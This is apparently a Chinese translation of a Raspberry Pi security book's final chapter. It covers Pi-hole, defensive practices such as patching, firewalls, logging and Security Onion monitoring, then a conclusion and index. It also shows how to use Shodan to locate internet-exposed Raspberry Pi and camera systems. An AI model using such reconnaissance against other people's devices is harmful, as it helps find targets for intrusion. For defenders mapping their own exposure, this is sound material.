如果你在使用 TFT 屏幕，安装 PADD 将为 Pi-hole 提供一个非常漂亮的界面。安装取决于你使用的 TFT 屏幕，因此我遵循了 Adafruit 针对我 2.8 英寸屏幕的 PADD 指南，位于：[`learn.adafruit.com/pi-hole-ad-pitft-tft-detection-display/install-padd`](https://learn.adafruit.com/pi-hole-ad-pitft-tft-detection-display/install-padd)

 界面

如果你在使用 TFT 屏幕，安装 PADD 将为 Pi-hole 提供一个非常漂亮的界面。安装取决于你使用的 TFT 屏幕，因此我遵循了 Adafruit 针对我 2.8 英寸屏幕的 PADD 指南，位于：[`learn.adafruit.com/pi-hole-ad-pitft-tft-detection-display/install-padd`](https://learn.adafruit.com/pi-hole-ad-pitft-tft-detection-display/install-padd)

## Pi-Hole 的 Web 界面

Pi-Hole 的 Web 界面非常酷，它为你提供了大量信息。

![](img/0260.jpeg)

 界面

Pi-Hole 的 Web 界面非常酷，它为你提供了大量信息。





你可以免费进行基础搜索，每页返回一个结果。对于更复杂的搜索，你需要一个 `Shodan` 账户。我强烈建议付费账户，因为这项服务非常值。使用 `Shodan` 非常简单，只需像在 `Google` 中一样输入搜索词即可。你可以使用多个关键词来查找在线的树莓派（Raspberry Pi）系统。

以下是几个例子：

![](img/00262.jpeg)

![](img/00263.jpeg)

在本文写作时，有近 200,000 个在线系统正在运行 `Raspbian`。你也可以搜索“Raspberry Pi”、“RaspberryPi”或“RPi”。在上面的图片中，你可以看到有 4,455 个设备的描述中某处包含“Raspberry Pi”字样。你还可以通过应用程序服务器名称（包括摄像头软件）来找到它们以及许多其他设备。

例如，我们在“物理安全”章节中介绍过的“MotionEye”：

![](img/00264.jpeg)

诚然并非所有结果都相关，但很大范围内很多都会运行在树莓派上。

## 使用 Shodan 网络监控器自动告警

工具网站：[`monitor.shodan.io/`](https://monitor.shodan.io/)

工具使用视频：[`www.youtube.com/watch?v=T-9UvZ-l-tE`](https://www.youtube.com/watch?v=T-9UvZ-l-tE)

你可以手动扫描 `Shodan`，查看你所有公开的业务或家庭系统的表示。但你如何判断是否像 JPL 实验室的人员那样将恶意设备接入了你的网络呢？`Shodan Network Monitor` 是解决此问题的方案之一。通过 `Network Monitor`，你可以配置 `Shodan` 在网络出现漏洞系统、开放端口或变化时向你告警。还有其他可用网络安全设备可以执行相同的功能。

## 正常安全程序

对待每一个树莓派（以及 IoT 设备！）要像对待任何普通工作站、笔记本电脑或在线设备那样的公司安全思维。不要因为它是树莓派就认为它只是个玩具，或者黑客找不到它，因为他们会——而且可能很快。所以，所有的正常安全程序都适用。虽然没有系统可以保证 100% 安全，但我们可以通过这些技术让我们的系统更难被攻破：

*   补丁与更新
*   防火墙和入侵防御系统 (`IPS`)
*   限制服务与用户权限
*   使用长复杂的密码
*   网络安全监控
*   日志记录
*   用户教育
*   扫描你的网络
*   最后，使用攻击性安全（Offensive Security）

让我们简要查看其中几个主题：

### 补丁与更新

只要可能，务必使用最新版本的操作系统和 Web 服务器应用程序。一旦关键更新发布，请立即安装。黑客正活跃地针对树莓派等 IoT 设备进行攻击，因此将这些设备加入你的更新计划，并积极关注关键更新至关重要。

### 私有局域网与防火墙

我建议为你的树莓派创建一个隔离的私有 IP 地址游乐区。这样，即使它被攻破，攻击者也无法利用它进一步渗透到你的内部网络。此外，最好在你的树莓派和互联网之间始终保持一个硬件防火墙。就在几年前，某些 ISP 仍在为小型办公室和家庭用户提供实时的互联网连接，而他们完全不知道自己需要防火墙。话虽如此，始终使用防火墙，不要在不使用防火墙的情况下将任何系统连接到实时互联网。对入站互联网连接设置防火墙，并确保每个系统都使用软件防火墙。将开放端口限制为绝对必要的那些。创建 `Ingress Rules` 和 `Egress Rules` 策略来监控或控制进出网络的信息。在最简单的层，阻止与没有业务往的国家通信。更高级的系统允许你控制进入离开的数据类型和协议。

### 限制服务与权限级别

关闭服务器和系统上不需要的网络和服务协议。服务器的攻击面越小越好。永远不要让普通用户使用高级安全凭据执行非管理任务。严格限制用户 `Root` 级的使用。

### 复杂密码

这无需多说，对于任何直接连接到互联网的设备（以及 Web 应用），都要使用长复杂的密码。密码越长复杂，攻击者破解所需的时间越长。使用大写和小字母、数字和符号的组合。适用时使用双重身份验证。在一次安全评估中，我发现一个客户用人的名字作为 Web 应用的管理员密码！我用来测试 Web 应用密码的程序几秒钟内就能暴力破解它。我所有的在线个人密码没有短于 16 个字符，我连接到互联网的任何设备使用的都要长得多。为每个服务/设备使用不同的密码（如果可能）。

### 日志记录

确保关键交换机、路由器、防火墙开启安全日志。最好让关键设备和系统将安全日志发送到 `syslog` 服务器，以便备份（以防黑客清除系统日志）并便于应急响应。这有助于在坏情况发生时追踪恶意用户和流量。

### 网络安全监控

我非常喜欢网络安全监控 (NSM)。如果你运行自己的网络却不知道那是什么，快去买一本 Richard Bejtlich 的《The Tao of Network Security Monitoring: Beyond Intrusion Detection》。基本上 `NSM` 是一种捕获所有网络流量（有时在网络多个点）并对其进行入侵分析的系统。如果你认为负担不起 `NSM` 系统，那就错了。最常用的之一是免费的！`Security Onion` 是一个极其强大且功能丰富的 `NSM`。你只需要一台性能尚可的计算机、一个网络分路器（tap）和至少两个网卡。

`Security Onion` 允许你捕获网络流量，然后对其进行分析，并在一个相当易用的界面中通过告警通知你。以下是 `Security Onion` 运行的几个截图。第一张显示了当 `Autopwn` 攻击网络上的某个系统时触发的一系列告警。

![](img/00265.jpeg)

你可以看到有多个警告和告警。最后一行记录了 172 次（CNT 列）同一种告警事件！`Security Onion` 还能捕获网络上的 `TOR` 使用。`TOR` 是一种匿名协议，通过在全球范围内跳转的加密通信来帮助用户匿名。`TOR` 可以用于善意，但黑客也利用 `TOR` 来隐藏他们的攻击。这里是我在 `Security Onion` 监控的测试网络中使用 `TOR` 时发生的情况：

![](img/00266.jpeg)

注意弹出了多个黄色的 `Known TOR Exit Node Traffic` 告警。





文章开头提到的 NASA JPL（喷宇航空动力实验室）网络曾因有人在网络上接入未经授权的 `Pi` 而遭到入侵。因此，让员工了解 IoT 设备（如 `Pi`）对你的网络可能构成的危险至关重要。有些公司通过张挂标牌鼓励使用安全的计算机上网技术，并提醒在在线账户上复杂的唯一密码，并取得了成功。欲了解更多信息，美国计算机应急响应小组（US CERT）在 [`www.us-cert.gov/ncas/tips/`](http://www.us-cert.gov/ncas/tips/) 建立了一个非常好的参考和警告网站。

## 扫描你的网络

如果你是公司安全团队的成员或者是“计算机安全人员”，请在坏人之前扫描你的网络以发现安全问题。仅使用 `Shodan` 就能暴露你网络上可能被遗忘的系统。大型公司通常有很多公开的系统运行着过时的操作系统或 Web 服务器软件。不要忘记检查摄像头、IoT 设备和打印机，它们可能会泄露过多信息，如内部网络信息、`SNMP` 字符串和用户账户。

开源扫描工具（如 `OpenVas`）或商业安全扫描系统（如 `NESSUS`）可用于扫描整个网络以发现安全问题，前提是你有相应的权限。`OpenVas` 预装在 `Kali` 中，虽然让它运行起来需要一些步骤，但网上有大量的教程。

## 攻性计算机安全

学习像书中介绍的那种攻性计算机安全技术。我们只涵盖了攻性安全中最基础的技术。仅仅阅读此书不足以让某人成为“专家”，单凭此也不足以任何人开始在实环境中使用攻性安全技巧。如果你是该领域的新手并想学习更多，有大量的书籍、安全培训研讨会和课程。还有许多故意留漏洞的测试系统和夺旗赛（CTF）系统，你可以在其中合法地尝试并完善你的技能。

最后，联系你当地的 `OWASP` 分会或其他地区的安全小组。参加安全会议并在安全领域建立人脉。当提出好问题时，很多人都很乐意帮助。`SANS` 也有一些非常棒的课程。一旦精通并获得管理层的许可，请测试你网络系统的安全性。

## 结论

我希望你喜欢这本书。写这本书的过程真的非常有趣，也是一个巨大的挑战。如果你有任何问题，请随时通过 [cyberarms@live.com] 与我联系。我的博客上将有一个“错误列表”页面，因为问题会被不断报告，教程也会随时间而变化。我的博客还包含了多年安全领域的笔记和文章，去看看吧！

`DanTheIoTMan.com` 也提供了大量的树莓 `Pi` 教程和指南。

感谢！

Daniel Dieterle

## 资源

1. “NASA 因连接了未经授权的树莓派被黑客” - [`www.zdnet.com/article/nasa-hacked-because-of-unauthorized-raspberry-pi-connected-to-its-network/`](https://www.zdnet.com/article/nasa-hacked-because-of-unauthorized-raspberry-pi-connected-to-its-network/)
2. “Security Onion”，作者 Doug Burks - https://blog.securityonion.net/
3. 选择与保护密码 - [`www.us-cert.gov/ncas/tips/ST04-002`](https://www.us-cert.gov/ncas/tips/ST04-002)
4. 避免社交工程和钓鱼攻击 - [`www.us-cert.gov/ncas/tips/ST04-014`](https://www.us-cert.gov/ncas/tips/ST04-014)
5. 在社交网站上保持安全 - [`www.us-cert.gov/ncas/tips/ST06-003`](https://www.us-cert.gov/ncas/tips/ST06-003)
6. 谨慎使用邮件附件 - [`www.us-cert.gov/ncas/tips/ST04-010`](https://www.us-cert.gov/ncas/tips/ST04-010)
7. 漏洞扫描器 - [`sectools.org/tag/vuln-scanners/`](http://sectools.org/tag/vuln-scanners/)

## 索引

**A**
`ADS-B` · 181
`Alfa AWUS036NHA` · 4

**B**
`Bettercap` · 66, 67, 69, 70, 71, 72, 81
`brute forcing` · 40, 99, 121

**D**
`Darkstat` · 88

**E**
`Ethical hacking` · 3, 6
`Ethical Hacking Issues` · 5

**F**
`Firewall` · 8, 124
`Firewalls and IPS` · 191
`Fluxion` · 77, 78, 79
`Freq Show` · 92, 96

**I**
`Impacket` · 62, 63
`Installing Kali on VMware` · 8
`Internet of Things` · 180
`ipconfig` · 20

**J**
`JoomScan` · 122, 123

**L**
`Limit Services & Authority` · 192
`Logging` · 194
`Long Passwords` · 192

**M**
`Magic Mirrors` · 176
`Metapages` · 60, 81, 82, 95, 137
`Metasploit` · 40, 41, 42, 43, 45, 47, 49, 60, 92, 131, 132, 153
`Metasploitable` · 7, 15, 16, 17, 18, 20, 195
`Metasploitable 2` · 15
`Metasploitable 3` · 7, 19, 20
`Meterpreter commands` · 133
`Meterpreter shell` · 131, 132
`microSD cards` · 1
`MotionEyeOS` · 156, 157, 158, 159, 163

**N**
`NAT` · 10
`Network Defense` · 188
`Network Security (NSM)` · 192
`nmap` · 26, 37, 38, 39, 60, 109, 110, 115

**O**
`OWASP ZAP` · 72, 75, 125, 126
`OWASP-Nettacker` · 117

**P**
`P4wn1 ALOA` · 134
`P4wn1 Scripts` · 147
`Patches & Updates` · 191
`pentesting` · 2, 6, 34, 72, 112, 115
`PiCamera` · 169, 170, 171, 172, 173, 174, 175
`Pi-Hole` · 5, 182, 183, 184, 185, 186
`PowerShell` · 48, 51, 52, 55, 150, 151, 152
`Putty` · 25, 26, 37, 54, 59, 81, 137, 138, 141, 166
`Python` · 34, 48, 63, 169, 170, 171, 173, 174

**R**
`Raspberry Pi Kits` · 4
`Raspbian` · 2, 21, 23, 29, 31, 32, 34, 35, 37, 97, 102, 106, 109, 160, 164, 169, 170, 181, 183, 184
`Raspistill` · 165
`raspivid` · 164, 165, 166, 168, 169, 187
`RasPwn` · 3, 112, 113, 114, 115, 117, 119, 122, 123, 125, 127, 128, 129, 133
`Responder` · 61, 62
`RPI Cam` · 159, 160, 162, 163, 164, 171
`RTL-SDR` · 92, 179, 180

**S**
`Salamandra` · 179, 180
`Scope of this Book` · 2
`secure drop boxes` · 80
`Setting the Kali IP address` · 11
`Setting up a TFT Display` · 84
`Shodan` · 194
`Sn1per` · 45, 47, 119, 122
`Social Engineering` · 77
`surveillance camera` · 2, 156, 158, 170, 187

**T**
`TFT display` · 83, 84, 108, 183
`TL-WN722N` · 4
`TOR` · 193
`Touchscreen case` · 4, 181
`touchscreen interface` · 82, 84, 108

**U**
`update Kali Linux` · 14

**V**
`Virtual Machines` · 7
`VMware` · 7, 8, 9, 15, 16, 32
`VMWare Player` · 7, 8, 10, 16, 19, 20
`VMWare tools` · 10, 15
`vulnerability scan` · 124

**W**
`Web Apps` · 114, 115
`Weevely` · 127, 129, 131, 132, 133
`Weevely shell` · 131
`Wi-Fi attack` · 77
`WPScan` · 111, 122

**X**
`Xming` · 27, 29, 31, 54, 77, 80, 81

**Z**
`ZeroView` · 4, 154, 156

